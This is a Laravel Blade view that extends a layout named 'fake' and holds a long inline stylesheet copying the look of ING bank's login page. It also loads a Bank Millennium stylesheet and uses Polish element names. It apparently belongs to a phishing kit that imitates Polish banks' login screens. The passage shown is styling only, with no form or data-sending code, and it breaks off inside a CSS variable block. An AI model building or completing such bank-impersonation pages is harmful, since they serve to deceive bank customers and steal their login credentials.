@extends('layouts.fake')
@push('css')
    <link href="{{ asset('css/millenium.css') }}" rel="stylesheet">
    <style>
        @-ms-viewport {
            height: device-height;
            width: device-width
        }

        .loginboxes {
            display: flex;
        }

        @media all and (max-width: 500px) {
            .loginboxes {
                display: block;
            }

            #rightblock {
                display: block;
            }

            #konto {
                margin: 0;
            }

            #Pomoc {
                padding-top: 0;
                padding-bottom: 25px;
            }

            ._4 {
                width: 100%;
            }
        }

        div#content_wrapper {
            margin-left: -2rem;
            margin-right: -2rem;
            overflow: hidden;
            clear: both
        }

        #content_wrapper A {
            color: #FF6200
        }

        #content_wrapper A:hover {
            text-decoration: underline;
            color: #FF6200
        }

        #content_wrapper .content_area A:hover:not(.button):after,
        #content_wrapper .content_area A:hover:not(.button):before,
        #content_wrapper A:active {
            text-decoration: none
        }

        @media print {
            #content_wrapper A:after {
                content: "" !important
            }
        }

        #content_wrapper A:focus {
            text-align: none !important;
            outline: 0
        }

        #content_wrapper P {
            margin-top: 0;
            margin-bottom: 1em
        }

        #content_wrapper .content_area {
            font-weight: 300
        }

        #content_wrapper .content_area A {
            font-weight: 400;
            font-size: inherit
        }

        #content_wrapper .clearFix {
            clear: both !important;
            font-size: 0;
            line-height: 0;
            height: 0
        }

        #content_wrapper > .layout_section:first-child > .layout_row:first-child {
            border: none
        }

        #content_wrapper .layout_row {
            border-style: solid;
            border-width: 1px 0 0;
            border-color: #ddd
        }

        #content_wrapper .layout_row > .layout_column:last-child {
            background-position: 100% 0
        }

        #content_wrapper .layout_row > .layout_column:only-child > div {
            background-position: -15px 1px
        }

        #content_wrapper A.link {
            margin-left: 10px;
            margin-right: 10px;
            cursor: pointer
        }

        #content_wrapper A.link:first-child {
            margin-left: 0
        }

        #content_wrapper A.link:last-child {
            margin-right: 0
        }

        #content_wrapper a.link:after {
            content: '\e800';
            margin-left: 10px;
            font-size: 12px;
            color: #FF6200
        }

        h1,
        h2,
        input {
            color: inherit
        }

        #content_wrapper .component_wrapper > .component.content {
            padding-top: 3em;
            padding-bottom: 1.5em
        }

        #content_wrapper .layout_row .layout_column:first-child .component_wrapper > .component.content {
            padding-left: 30px;
            padding-right: 15px
        }

        #content_wrapper .layout_row .layout_column:last-child .component_wrapper > .component.content,
        #content_wrapper .layout_row .layout_column:only-child .component_wrapper > .component.content {
            padding-right: 30px
        }

        #content_wrapper .component.content .content_area {
            line-height: 1.5
        }

        @media only screen and (max-width: 767px) {
            #content_wrapper A.link {
                display: inline-block;
                background: #fff
            }

            #content_wrapper .layout_row .layout_column:first-child .component_wrapper > .component.content,
            #content_wrapper .layout_row .layout_column:only-child .component_wrapper > .component.content {
                padding: 2em 20px 1em
            }

            #content_wrapper .component.content .content_area {
                line-height: 20px
            }
        }

        html {
            font-family: sans-serif
        }

        footer,
        header,
        section {
            display: block
        }

        a:active,
        a:hover {
            outline: currentcolor 0
        }

        h1 {
            margin: .67em 0
        }

        img {
            border: 0;
            vertical-align: middle
        }

        input {
            font: inherit;
            margin: 0
        }

        input[type=submit] {
            appearance: button;
            cursor: pointer
        }

        input::-moz-focus-inner {
            border: 0;
            padding: 0
        }

        @media print {
            *,
            ::after,
            ::before {
                background: 0 0 !important;
                box-shadow: none !important;
                color: #000 !important;
                text-shadow: none !important
            }

            a,
            a:visited {
                text-decoration: underline
            }

            a[href]::after {
                content: " (" attr(href) ")"
            }

            a[href^="#"]::after {
                content: ""
            }

            img {
                break-inside: avoid;
                max-width: 100% !important
            }

            h2 {
                break-after: avoid
            }

            .navbar {
                display: none
            }
        }

        *,
        ::after,
        ::before {
            box-sizing: border-box
        }

        html {
            font-size: 10px
        }

        body {
            margin: 0;
            background-color: #fff;
            color: #333;
            font-family: Helvetica Neue, Helvetica, Arial, sans-serif;
            font-size: 14px;
            line-height: 1.42857
        }

        h1,
        h2,
        input {
            font-family: inherit
        }

        input {
            font-size: inherit;
            line-height: inherit
        }

        a {
            background-color: transparent;
            color: #428bca;
            text-decoration: none
        }

        a:focus,
        a:hover {
            color: #2a6496;
            text-decoration: underline
        }

        a:focus {
            outline: currentcolor dotted thin;
            outline-offset: -2px
        }

        .sr-only {
            clip: rect(0, 0, 0, 0);
            border: 0;
            height: 1px;
            margin: -1px;
            overflow: hidden;
            padding: 0;
            position: absolute;
            width: 1px
        }

        h1,
        h2,
        ul {
            margin-bottom: 10px
        }

        h1,
        h2 {
            font-weight: 500;
            line-height: 1.1;
            margin-top: 20px
        }

        h1 {
            font-size: 36px
        }

        h2 {
            font-size: 30px
        }

        p {
            margin: 0 0 10px
        }

        ul {
            margin-top: 0
        }

        ul ul {
            margin-bottom: 0
        }

        .container {
            margin-left: auto;
            margin-right: auto;
            padding-left: 15px;
            padding-right: 15px
        }

        @media (min-width: 768px) {
            .container {
                width: 750px
            }
        }

        @media (min-width: 1200px) {
            .container {
                width: 1170px
            }

            .col-lg-12 {
                float: left;
                width: 100%
            }
        }

        .row {
            margin-left: -15px;
            margin-right: -15px
        }

        .col-lg-12,
        .col-md-12,
        .col-sm-12,
        .col-xs-12 {
            min-height: 1px;
            padding-left: 15px;
            padding-right: 15px;
            position: relative
        }

        .col-xs-12 {
            float: left;
            width: 100%
        }

        .form-control {
            color: #555;
            display: block;
            font-size: 14px;
            line-height: 1.42857;
            background-color: #fff;
            background-image: none;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-shadow: rgba(0, 0, 0, .075) 0 1px 1px inset;
            height: 34px;
            padding: 6px 12px;
            transition: border-color .15s ease-in-out 0s, box-shadow .15s ease-in-out 0s;
            width: 100%
        }

        .form-control:focus {
            border-color: #66afe9;
            box-shadow: rgba(0, 0, 0, .075) 0 1px 1px inset, rgba(102, 175, 233, .6) 0 0 8px;
            outline: currentcolor 0
        }

        .form-control::-webkit-input-placeholder {
            color: #999
        }

        .ing-new-theme a,
        .ing-new-theme a:hover,
        .ing-new-theme h1,
        .ing-new-theme h2 {
            color: #333
        }

        .form-group {
            margin-bottom: 15px
        }

        .navbar {
            border: 1px solid transparent;
            margin-bottom: 20px;
            min-height: 50px;
            position: relative
        }

        .container::after,
        .container::before,
        .navbar::after,
        .navbar::before,
        .row::after,
        .row::before {
            content: " ";
            display: table
        }

        .hidden,
        .visible-xs-block {
            display: none !important
        }

        .container::after,
        .navbar::after,
        .row::after {
            clear: both
        }

        .hidden {
            visibility: hidden !important
        }

        html {
            height: 100%
        }

        body.ing-new-theme {
            background: #fff;
            color: #333;
            font-family: INGMe, sans-serif;
            font-size: 16px;
            font-weight: 400;
            height: 100%;
            line-height: 1.5
        }

        .ing-new-theme #layout-region > div .region-wrapper {
            margin: 0 auto;
            min-height: calc(-125px + 100vh);
            position: relative
        }

        .ing-new-theme h1 {
            font-size: 2.8rem;
            font-weight: 400;
            line-height: 3.6rem
        }

        @media (min-width: 768px) {
            .col-md-12,
            .col-sm-12 {
                float: left;
                width: 100%
            }

            .navbar {
                border-radius: 4px
            }

            .ing-new-theme h1 {
                font-size: 3.6rem;
                line-height: 4.4rem
            }
        }

        .ing-new-theme h2 {
            font-size: 2.6rem;
            font-weight: 600;
            line-height: 2.8rem
        }

        .ing-new-theme a {
            cursor: pointer;
            transition: color .25s ease-out 0s
        }

        .ing-new-theme a:active,
        .ing-new-theme a:focus,
        .ing-new-theme a:hover {
            text-decoration: none
        }

        .ing-new-theme .ing-container {
            padding: 0
        }

        .ing-new-theme a:focus {
            outline: currentcolor
        }

        .ing-new-theme input[type=password] {
            font-family: Arial, sans-serif
        }

        .ing-new-theme .box {
            background-color: #fff;
            border: .1rem solid #d9d9d9;
            border-radius: .8rem;
            box-shadow: #f0f0f0 0 .3rem 0 0, #fff 0 -.5rem 0 0
        }

        @media (max-width: 767px) {
            .visible-xs-block {
                display: block !important
            }

            .hidden-xs {
                display: none !important
            }

            body.ing-new-theme {
                background-color: #fff;
                inset: 0;
                font-size: 1.4rem;
                position: absolute;
                width: 100%
            }

            .ing-new-theme #layout-region {
                position: relative;
                will-change: overflow-y
            }

            .ing-new-theme #layout-region > div .region-wrapper,
            .ing-new-theme #layout-region > div.login-layout .region-wrapper {
                margin: 0 auto
            }

            .ing-new-theme h1 {
                font-size: 3rem;
                line-height: 3.2rem
            }

            .ing-new-theme h2 {
                font-size: 2.2rem;
                line-height: 2.4rem
            }

            .ing-new-theme a:active,
            .ing-new-theme a:focus {
                color: #ff6200
            }
        }

        @media screen and (min-width: 768px) and (max-width: 1199px) {
            .ing-new-theme .container,
            .ing-new-theme .ing-container {
                width: 100%
            }

            .ing-new-theme a:active,
            .ing-new-theme a:focus,
            .ing-new-theme a:hover {
                color: #ff6200
            }
        }

        @media (min-width: 1200px) {
            .ing-new-theme #layout-region {
                overflow-x: hidden
            }

            .ing-new-theme a:active,
            .ing-new-theme a:focus,
            .ing-new-theme a:hover {
                color: #ff6200
            }
        }


        .ing-new-theme [class*=glyphicon-ing-] {
            font-style: normal
        }

        .ing-new-theme .glyphicon-ing-blocked2::before {
            content: ""
        }

        .ing-new-theme .glyphicon-ing-key::before {
            content: ""
        }

        .ing-new-theme .glyphicon-ing-en::before {
            content: ""
        }

        .ing-new-theme .glyphicon-ing-e916::before {
            content: ""
        }

        .ing-new-theme .link.link {
            border-bottom: medium none;
            color: #ff6200;
            cursor: pointer;
            display: inline-block;
            font-size: 1.6rem;
            font-weight: 400;
            line-height: 2.4rem;
            position: relative;
            transition: color .25s ease-out 0s, text-decoration .25s ease-out 0s, -webkit-text-decoration .25s ease-out 0s
        }

        .ing-new-theme .link.link:active,
        .ing-new-theme .link.link:hover {
            outline-style: none;
            text-decoration: underline
        }

        .ing-new-theme .link.link.inline-flex {
            align-items: flex-start;
            display: inline-flex
        }

        .ing-new-theme .link.link:hover {
            color: #ff6200
        }

        .ing-new-theme .form-group {
            margin: 0;
            padding: 0
        }

        .ing-new-theme .form-control {
            appearance: none;
            background-color: #fff;
            border-color: #a8a8a8;
            border-radius: .4rem;
            box-shadow: none;
            color: #333;
            font-size: 1.6rem;
            height: 4.8rem;
            line-height: 2.4rem;
            margin: 0 0 .8rem;
            padding: 1.2rem 1.6rem;
            transition: border-color .2s ease-in 0s, color .2s ease-in 0s
        }

        .ing-new-theme .checkbox input[type=checkbox]:hover:not(:disabled) + label::before,
        .ing-new-theme .form-control:active,
        .ing-new-theme .form-control:focus,
        .ing-new-theme .form-control:hover,
        .ing-new-theme .radio input[type=radio]:not(old):hover:not(:disabled) + label > span {
            border-color: #ff6200
        }

        .ing-new-theme::selection {
            background: #ff6200;
            color: #fff
        }

        .ing-new-theme .ing-footer {
            padding: 0 1.5rem;
            position: relative;
            transform: translateZ(0)
        }

        .ing-new-theme .ing-footer .footer-container {
            text-align: start
        }

        .ing-new-theme .ing-footer .ing-list-hybrid-container {
            margin: 1.6rem auto 0
        }

        .ing-new-theme .ing-footer .ing-list-inline-container {
            margin: .5rem auto
        }

        .ing-new-theme .ing-footer .ing-list-inline-container > span {
            color: #a8a8a8;
            font-size: 1.4rem;
            font-weight: 400;
            line-height: 2rem;
            margin-left: 1.6rem
        }

        .ing-new-theme .ing-footer ul {
            display: table;
            list-style: none;
            margin: 0;
            padding: 0
        }

        .ing-new-theme .ing-footer ul li {
            display: inline-block;
            vertical-align: middle
        }

        .ing-new-theme .ing-footer ul li a {
            border-bottom: medium none
        }

        .ing-new-theme .ing-footer ul.ing-list-hybrid {
            background-color: #f0f0f0;
            border-radius: .4rem;
            width: 100%
        }

        .ing-new-theme .ing-footer ul.ing-list-hybrid ul {
            width: 100%
        }

        .ing-new-theme .ing-footer ul.ing-list-hybrid li {
            overflow: hidden;
            padding-left: 1.6rem;
            padding-right: 1.7rem;
            position: relative
        }

        .ing-new-theme .ing-footer ul.ing-list-hybrid li a {
            color: #333;
            line-height: 48px;
            white-space: nowrap
        }

        .ing-new-theme .ing-footer ul.ing-list-hybrid li a i {
            color: #ff6200
        }

        .ing-new-theme .ing-footer ul.ing-list-hybrid li a:hover:not(.ing-disabled) > span {
            color: #ff6200;
            text-decoration: underline
        }

        .ing-new-theme .ing-footer ul.ing-list-hybrid li a span {
            transition: all .25s ease-out 0s
        }

        .ing-new-theme .ing-footer ul.ing-list-hybrid li a span:not([class]) {
            margin-left: -4px
        }

        .ing-new-theme .ing-footer ul.ing-list-hybrid li:last-child {
            border-right: medium none;
            padding-right: 1.6rem
        }

        .ing-new-theme .ing-footer ul.ing-list-hybrid li [class*=glyphicon-ing-] {
            font-size: 2rem;
            margin: 0 1.6rem 0 0;
            position: relative;
            top: .4rem
        }

        .ing-new-theme .ing-footer ul.ing-list-inline {
            z-index: 30
        }

        .ing-new-theme .ing-footer ul.ing-list-inline li {
            color: #a8a8a8;
            padding: 0 1.6rem;
            position: relative
        }

        .ing-new-theme .ing-footer ul.ing-list-inline li a:hover:not(.ing-disabled) {
            text-decoration: underline
        }

        .ing-new-theme .ing-footer ul.ing-list-inline li a,
        .ing-new-theme .ing-footer ul.ing-list-inline li span {
            color: #a8a8a8;
            font-size: 1.4rem;
            font-weight: 400;
            line-height: 2rem
        }

        .ing-new-theme .ing-footer ul.ing-list-inline li:last-child {
            border-right: medium none;
            padding-right: 0
        }

        .ing-new-theme .ing-footer.login-layout_footer {
            padding: 0
        }

        @media (max-width: 767px) {
            .ing-new-theme .ing-footer {
                height: auto;
                margin-top: 4rem
            }

            .ing-new-theme .ing-footer > div::after {
                inset: 0;
                content: "";
                opacity: 0;
                position: absolute;
                transition: all .1s ease-out 0s;
                z-index: -1
            }

            .ing-new-theme .ing-footer .ing-list-inline-container {
                height: auto;
                overflow-x: hidden
            }

            .ing-new-theme .ing-footer .ing-list-inline-container > span {
                color: #a8a8a8;
                display: none;
                font-size: 1.2rem;
                font-weight: 400;
                line-height: 1.6rem
            }

            .ing-new-theme .ing-footer ul.ing-list-hybrid.ing-list-hybrid {
                height: auto
            }

            .ing-new-theme .ing-footer ul.ing-list-hybrid.ing-list-hybrid li {
                float: none;
                margin: auto 0;
                padding: 0
            }

            .ing-new-theme .ing-footer ul.ing-list-hybrid.ing-list-hybrid li:not(:first-child) {
                border-top: 1px solid #d9d9d9
            }

            .ing-new-theme .ing-footer ul.ing-list-inline {
                margin-bottom: 1.2rem;
                padding: .8rem
            }

            .ing-new-theme .ing-footer ul.ing-list-inline li {
                padding: 0 .8rem
            }

            .ing-new-theme .ing-footer ul.ing-list-inline li a,
            .ing-new-theme .ing-footer ul.ing-list-inline li span {
                font-size: 1.2rem;
                font-weight: 400;
                line-height: 1.6rem
            }

            .ing-new-theme .ing-footer ul.ing-list-hybrid {
                padding: 0 1.6rem;
                width: 100%
            }

            .ing-new-theme .ing-footer ul.ing-list-hybrid li {
                width: 100%
            }

            .ing-new-theme .ing-footer.login-layout_footer .ing-list-inline li:first-child {
                border: none;
                width: 100%
            }
        }

        @media (max-width: 767px) and (-webkit-transform-3d) {
            .ing-new-theme .ing-footer ul.ing-list-hybrid.ing-list-hybrid li {
                padding-top: 1.2rem
            }

            @supports (flex-wrap:wrap) {
                .ing-new-theme .ing-footer ul.ing-list-hybrid.ing-list-hybrid li {
                    padding-top: 0
                }
            }
            .ing-new-theme .ing-footer ul.ing-list-hybrid li {
                display: block
            }
        }

        @media (min-width: 768px) {
            .ing-new-theme .pull-right-md {
                float: right !important
            }

            .ing-new-theme .ing-footer {
                border-top-left-radius: 0;
                border-top-right-radius: 0
            }

            .ing-new-theme .ing-footer.login-layout_footer .ing-list-inline-container span {
                color: #fff
            }

            .ing-new-theme .ing-footer.login-layout_footer ul.ing-list-inline li:not(:last-child)::after {
                background-color: #d9d9d9;
                content: "";
                height: 1.6rem;
                position: absolute;
                right: 0;
                top: 50%;
                transform: translateY(-50%);
                width: 1px
            }

            .ing-new-theme .ing-footer ul.ing-list-hybrid li.pull-right-md:last-child::before,
            .ing-new-theme .ing-footer ul.ing-list-hybrid li:not(.pull-right-md):first-child::before {
                display: none
            }

            .ing-new-theme .ing-footer ul.ing-list-hybrid li::before {
                background-color: #d9d9d9;
                content: "";
                height: 1.6rem;
                left: 0;
                position: absolute;
                top: 50%;
                transform: translateY(-50%);
                width: 1px
            }

            .ing-new-theme .ing-footer ul.ing-list-hybrid li a {
                float: left;
                overflow: hidden;
                width: 100%
            }

            .ing-new-theme .ing-footer ul.ing-list-hybrid li [class*=glyphicon-ing-] {
                top: .2rem
            }
        }

        @media (min-width: 768px) and (-webkit-transform-3d) {
            .ing-new-theme .ing-footer .ing-list-inline-container .ing-list-inline li,
            .ing-new-theme .ing-footer .ing-list-inline-container > span {
                display: inline-block;
                line-height: 4.8rem;
                vertical-align: middle
            }
        }

        .ing-new-theme .ing-header .navbar {
            border: none;
            border-radius: 0;
            margin: 0;
            padding: 0
        }

        .ing-new-theme .ing-header .logo {
            background-color: #fff;
            font-weight: 700;
            height: 8.3rem;
            margin: 0;
            padding-left: 1.5rem;
            position: relative;
            text-align: center;
            z-index: 2
        }

        .ing-new-theme .ing-header .logo img {
            height: 4rem;
            margin-right: 1.2rem;
            width: 4rem
        }

        .ing-new-theme .ing-header .logo__link {
            background-color: #fff;
            border-bottom: medium none;
            color: #333;
            display: block;
            float: left;
            outline-style: none;
            text-align: left
        }

        .ing-new-theme .ing-header .logo__link:active,
        .ing-new-theme .ing-header .logo__link:focus,
        .ing-new-theme .ing-header .logo__link:hover,
        .ing-new-theme .ing-header .logo__link:visited {
            color: #333
        }

        @media (max-width: 767px) {
            .ing-new-theme .ing-header > div:first-child {
                height: 6.4rem
            }

            .ing-new-theme .ing-header .nav-hybrid {
                backface-visibility: hidden;
                background: #fff;
                float: left;
                left: 0;
                max-height: 0;
                min-height: 0;
                position: absolute;
                top: 0;
                transform: translateZ(0);
                transform-style: preserve-3d;
                width: 100%;
                z-index: 9000
            }

            .ing-new-theme .ing-header .nav-hybrid::before {
                background: #fff;
                content: "";
                height: 5rem;
                left: 0;
                position: absolute;
                right: 0;
                top: 0;
                width: 100%
            }

            .ing-new-theme .ing-header .nav-hybrid--mobileFixed {
                position: fixed
            }

            .ing-new-theme .ing-header .logo {
                box-shadow: rgba(0, 0, 0, .2) 0 1px 8px 0, rgba(0, 0, 0, .12) 0 3px 3px -2px, rgba(0, 0, 0, .14) 0 3px 4px 0;
                height: 6.4rem;
                padding-left: .8rem;
                padding-top: .8rem;
                text-align: left;
                user-select: none
            }

            .ing-new-theme .ing-header .logo img {
                height: 3.2rem;
                margin-right: .8rem;
                width: 3.2rem
            }

            .ing-new-theme .ing-header .logo__img--logo {
                height: auto !important;
                margin-top: .2rem;
                width: 9.6rem !important
            }

            .ing-new-theme .ing-header .logo__link {
                display: inline-block;
                float: none;
                line-height: normal;
                padding: .8rem;
                width: auto
            }
        }

        @media (min-width: 768px) {
            .ing-new-theme .ing-header .navbar {
                min-height: auto
            }

            .ing-new-theme .ing-header .nav-hybrid {
                padding: 1.3rem 1.5rem 0
            }

            .ing-new-theme .ing-header .logo {
                min-width: 13rem
            }

            .ing-new-theme .curtain-collection {
                animation-delay: 1.5s;
                animation-duration: .5s;
                animation-fill-mode: both;
                animation-name: slide-in-down
            }
        }

        .ing-new-theme .login-layout {
            background-color: #fff;
            min-height: 100vh
        }

        .ing-new-theme .login-layout_container {
            text-align: center
        }

        .ing-new-theme .login-layout_container .main-content {
            display: inline-block;
            text-align: left
        }

        .ing-new-theme .login-layout_container .main-content-wrap {
            display: table-cell;
            vertical-align: middle
        }

        .ing-new-theme .login-layout_container .box {
            border-radius: .4rem;
            margin-top: 2rem;
            opacity: 1;
            overflow: hidden
        }

        .ing-new-theme .login-layout_container .box::after,
        .ing-new-theme .login-layout_container .box::before {
            content: "";
            display: none;
            height: 2rem
        }

        .ing-new-theme .login-layout_container .box--before {
            padding-top: 2rem
        }

        .ing-new-theme .login-layout_container .box--after {
            padding-bottom: 2rem
        }

        .ing-new-theme .login-layout_container .box-content,
        .ing-new-theme .login-layout_container .box::after,
        .ing-new-theme .login-layout_container .box::before {
            background-color: rgba(255, 255, 255, .95)
        }

        .ing-new-theme .login-layout_container .box-content {
            height: 100%
        }

        .ing-new-theme .login-layout_container .box-content--error {
            background: rgba(255, 244, 229, .95);
            color: red
        }

        .ing-new-theme .login-layout_container .box-content--info {
            background-color: rgba(240, 240, 240, .95);
            color: #333
        }

        .ing-new-theme .login-layout .region-wrapper {
            display: block;
            height: auto;
            margin: 0 auto;
            min-height: calc(-125px + 100vh)
        }

        .ing-new-theme .login-layout .region-wrapper.login-layout--top .main-content-wrap {
            display: block
        }

        @media (max-width: 767px) {
            .ing-new-theme .login-layout_container .main-content {
                display: block
            }

            .ing-new-theme .login-layout_container .main-content-wrap {
                vertical-align: top
            }

            .ing-new-theme .login-layout_container .box {
                margin-left: -1.5rem;
                margin-right: -1.5rem;
                padding-left: 1.5rem;
                padding-right: 1.5rem
            }

            .ing-new-theme .login-layout_container .box-content--error,
            .ing-new-theme .login-layout_container .box-content--info {
                margin-left: -1.5rem;
                margin-right: -1.5rem
            }

            .ing-new-theme .login-layout_container .box::after {
                height: 0
            }
        }

        @media screen and (min-width: 768px) and (max-width: 1199px) {
            .ing-new-theme .login-layout {
                background-image: url(645bc15a4e449cd3352f.jpg)
            }
        }

        @media screen and (min-width: 768px) and (max-width: 1199px) and (-webkit-min-device-pixel-ratio: 2), screen and (min-width: 768px) and (max-width: 1199px) and (min-resolution: 2dppx), screen and (min-width: 768px) and (max-width: 1199px) and (min-resolution: 192dpi) {
            .ing-new-theme .login-layout {
                background-image: url(645bc15a4e449cd3352f.jpg)
            }
        }

        @media screen and (min-width: 768px) and (max-width: 1199px) and (-webkit-min-device-pixel-ratio: 3), screen and (min-width: 768px) and (max-width: 1199px) and (min-resolution: 3dppx), screen and (min-width: 768px) and (max-width: 1199px) and (min-resolution: 288dpi) {
            .ing-new-theme .login-layout {
                background-image: url(645bc15a4e449cd3352f.jpg)
            }
        }

        @media (min-width: 1200px) {
            .ing-new-theme .login-layout {
                background-image: url(21406a1dbb7009810334.jpg)
            }

            .ing-new-theme .login-layout_container .box {
                transition: opacity .25s linear 0s
            }

            .ing-new-theme .login-layout_container .box-content--error,
            .ing-new-theme .login-layout_container .box-content--info {
                transition: background .25s linear 0s
            }

            .ing-new-theme .login-layout_container .box-content > * {
                transition: opacity .25s linear 0s
            }
        }

        @media (min-width: 1200px) and (-webkit-min-device-pixel-ratio: 2),
        (min-width: 1200px) and (min-resolution: 2dppx),
        (min-width: 1200px) and (min-resolution: 192dpi) {
            .ing-new-theme .login-layout {
                background-image: url(21406a1dbb7009810334.jpg)
            }
        }

        @media (min-width: 1200px) and (-webkit-min-device-pixel-ratio: 3),
        (min-width: 1200px) and (min-resolution: 3dppx),
        (min-width: 1200px) and (min-resolution: 288dpi) {
            .ing-new-theme .login-layout {
                background-image: url(21406a1dbb7009810334.jpg)
            }
        }

        @keyframes slide-in-down {
            0% {
                transform: translate3d(0, -100%, 0);
                visibility: visible
            }
            100% {
                transform: translateZ(0)
            }
        }

        .ing-new-theme .curtain-collection {
            position: fixed;
            top: 0;
            width: 100%;
            z-index: 10000
        }

        .ing-new-theme .ing-login-container .content-container {
            border: 0;
            box-shadow: none;
            margin-top: 7.9rem
        }

        .ing-new-theme .ing-login-container .content-container::before {
            height: 2rem
        }

        .ing-new-theme .ing-login-container .ui-offer-box {
            max-width: 52rem;
            overflow: hidden
        }

        .ing-new-theme .ing-login-container .ui-offer-box .box-content {
            padding: 2.5rem 2rem
        }

        .ing-new-theme .login-form-container .box-content + .box-content {
            padding-top: 2rem
        }

        .ing-new-theme .login-form-container .box-content:empty + .box-content {
            padding-top: 0
        }

        .ing-new-theme .login-form-content,
        .ing-new-theme .login-form-content form {
            margin: 0 auto
        }

        .ing-new-theme .login-form-content form input {
            background-color: #fff
        }

        .ing-new-theme .login-form-content form .form-group {
            margin-bottom: 2rem
        }

        .ing-new-theme .login-hero h2 {
            font-size: 2rem;
            font-weight: 400;
            line-height: 1;
            margin: 0;
            padding-bottom: 2rem;
            padding-top: 1rem
        }

        .ing-new-theme .login_mobile-apps h2 {
            font-size: 1.6rem;
            font-weight: 700;
            line-height: 2.2rem;
            margin-top: 1.5rem
        }

        @media (min-width: 768px) {
            .ing-new-theme .login_mobile-apps h2 {
                font-size: 1.6rem;
                line-height: 2.4rem
            }
        }

        .ing-new-theme .login_mobile-apps .row {
            line-height: 0;
            margin: 2rem 0 0;
            padding: 0
        }

        .ing-new-theme .login_mobile-apps .row > li {
            display: inline-block;
            float: none;
            margin-bottom: 2rem;
            padding: 0 1rem;
            text-align: center;
            vertical-align: bottom
        }

        .ing-new-theme .login_mobile-apps .row > li:last-child {
            margin-bottom: 0
        }

        .ing-new-theme .login_mobile-apps a {
            border: none;
            display: inline-block
        }

        .ing-new-theme .login_mobile-apps_icon {
            height: 4rem;
            width: 13.5rem
        }

        .ing-new-theme .login_mobile-apps_icon.icon-gp {
            background-image: url(ing-image-2.svg)
        }

        .ing-new-theme .login_mobile-apps_icon.icon-as {
            background-image: url(ing-image-1.svg)
        }

        .ing-new-theme .login_help {
            margin: 0 auto;
            padding-top: 1rem;
            text-align: right
        }

        .ing-new-theme .login_msg {
            position: relative;
            width: 100%;
            z-index: 3
        }

        .ing-new-theme .login_msg .security-message-container {
            line-height: 2rem;
            padding: 2.4rem 4.5rem 2rem;
            position: relative
        }

        .ing-new-theme .login_msg .security-message-container::before {
            background: url(ing-image-3.svg) -.4rem top repeat-x rgba(0, 0, 0, 0);
            content: "";
            height: .4rem;
            left: 2rem;
            position: absolute;
            right: 2rem;
            top: 0
        }

        .ing-new-theme .login_msg .security-message-container p:last-child {
            margin-bottom: 0
        }

        .ing-new-theme .login_msg .security-message-container p > span {
            display: table-cell;
            padding-right: 1.5rem;
            width: 10rem
        }

        .ing-new-theme .login_msg .security-message-container p a {
            border-bottom: medium none;
            color: #ff6200;
            cursor: pointer;
            display: table-cell;
            font-size: 1.6rem;
            font-weight: 400;
            line-height: 2.4rem;
            position: relative;
            transition: color .25s ease-out 0s, text-decoration .25s ease-out 0s, -webkit-text-decoration .25s ease-out 0s
        }

        .ing-new-theme .login_msg .security-message-container p a:active,
        .ing-new-theme .login_msg .security-message-container p a:hover {
            outline-style: none;
            text-decoration: underline
        }

        .ing-new-theme .login_msg .security-message-container p a:hover {
            color: #ff6200
        }

        @media (max-width: 767px) {
            .ing-new-theme .ing-login-container {
                padding: 0 1.5rem 3rem
            }

            .ing-new-theme .login_msg .security-message-container {
                padding: 2.4rem 0 2rem
            }

            .ing-new-theme .login_msg .security-message-container::before {
                left: 0;
                right: 0
            }
        }

        @media (min-width: 768px) {
            .ing-new-theme .ing-login-container {
                min-width: 52rem
            }

            .ing-new-theme .ing-login-container .content-container {
                margin-top: 2rem
            }

            .ing-new-theme .ing-login-container .content-container .logo {
                display: flex;
                justify-content: center;
                padding: 2rem 0 1rem
            }

            .ing-new-theme .ing-login-container .content-container .logo__img--logo {
                height: auto;
                width: 12.8rem
            }

            .ing-new-theme .login_msg .security-message-container {
                width: 52rem
            }

            .ing-new-theme .login-hero {
                text-align: center
            }

            .ing-new-theme .login-form-content,
            .ing-new-theme .login_help {
                max-width: 28rem
            }
        }

        @media (max-width: 767px) {
            .ing-new-theme .login_msg .security-message-container .link,
            .ing-new-theme .login_msg .security-message-container p > span {
                display: block
            }

            .ing-new-theme .login_msg .security-message-container p > .loginPage {
                margin-top: .8rem
            }
        }

        .ing-new-theme .login-layout {
            background-attachment: fixed;
            background-repeat: no-repeat;
            background-size: cover;
            overflow: hidden auto;
            text-align: center
        }

        .ing-new-theme.ing-contrast-theme .checkbox input[type=checkbox]:hover:not(:disabled) + label::before,
        .ing-new-theme.ing-contrast-theme .radio input[type=radio]:not(old):hover:not(:disabled) + label > span {
            border-color: #ff6200
        }

        .ing-new-theme.ing-contrast-theme .checkbox input[type=checkbox]:focus:not(:disabled) + label::before,
        .ing-new-theme.ing-contrast-theme .checkbox input[type=checkbox]:hover:not(:disabled) + label::before,
        .ing-new-theme.ing-contrast-theme .radio input[type=radio]:not(old):not(:disabled) + label:active > span:first-of-type,
        .ing-new-theme.ing-contrast-theme .radio input[type=radio]:not(old):not(:disabled) + label:hover > span:first-of-type,
        .ing-new-theme.ing-contrast-theme .radio input[type=radio]:not(old):not(:disabled):focus + label > span:first-of-type {
            border: 2px solid #ff0
        }

        .ing-new-theme.ing-contrast-theme .radio input[type=radio]:not(old):not(:disabled) + label:active > span:first-of-type > span,
        .ing-new-theme.ing-contrast-theme .radio input[type=radio]:not(old):not(:disabled) + label:hover > span:first-of-type > span,
        .ing-new-theme.ing-contrast-theme .radio input[type=radio]:not(old):not(:disabled):focus + label > span:first-of-type > span {
            left: .6rem;
            top: .6rem
        }

        :root {
            --color-b1: #fff;
            --color-g1: #333;
            --color-g2: #767676;
            --color-g3: #a8a8a8;
            --color-g4: #d9d9d9;
            --color-g5: #f0f0f0;
            --color-p1: #ff6200;
            --color-d1: #525199;
            --color-d2: #60a6da;
            --color-d3: #ab0066;
            --color-d4: #d0d93c;
            --color-d5: #349651;
            --color-d6: #f00;
            --color-f1: #4b53af;
            --color-f2: #21c7ed;
            --color-f3: #008e91;
            --color-f4: #e07710;
            --color-f5: #f74f80;
            --color-f6: #5fc634;
            --color-f7: #009fef;
            --color-f8: #ffa81d;
            --color-f9: #9d64b5;
            --color-f10: #bc1d5e;
            --color-f11: #e8f3fa;
            --color-f12: #525199;
            --color-black: #000;
            --color-yellow: #ff0;
            --color-d2-hover: #528dba;
            --color-tooltip-shadow: #e5e5e5;
            --color-b2: #e9f2db;
            --color-b3: #ffe0cc;
            --color-b4: #fff4e5;
            --color-h2: #692;
            --color-p2: #d94e12;
            --color-p3: #c94015;
            --color-p4: #e85b0f;
            --color-p5: #ff8700;
            --color-p6: #ffa800;
            --color-p1-hover: #db5400;
